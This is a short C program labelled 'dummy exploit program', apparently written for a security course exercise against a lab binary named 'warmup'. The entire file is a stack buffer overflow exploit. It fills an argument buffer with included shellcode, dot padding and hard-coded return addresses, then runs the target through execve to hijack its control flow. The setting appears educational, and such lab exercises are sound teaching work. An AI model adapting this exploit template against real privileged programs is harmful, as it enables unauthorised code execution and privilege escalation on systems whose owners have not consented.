/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "shellcode.h"

#define TARGET "/usr/local/bin/warmup"

int main(void) {
  char *args[3];
  char *env[1];
  char argbuff[109];
  size_t i, len;

  // Create the 108-character arguemnt buffer
  strcpy(argbuff, shellcode);
  len = strlen(argbuff);
  for (i = len; i < 100; ++i) {
    argbuff[i] = '.';
  }
  strcpy(argbuff+100, "\x98\xde\xbf\xff\xd4\xdd\xbf\xff");

  // another way
  args[0] = TARGET;
  args[1] = argbuff;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  // execve only returns if it fails
  fprintf(stderr, "execve failed\n");
  return 1;
}
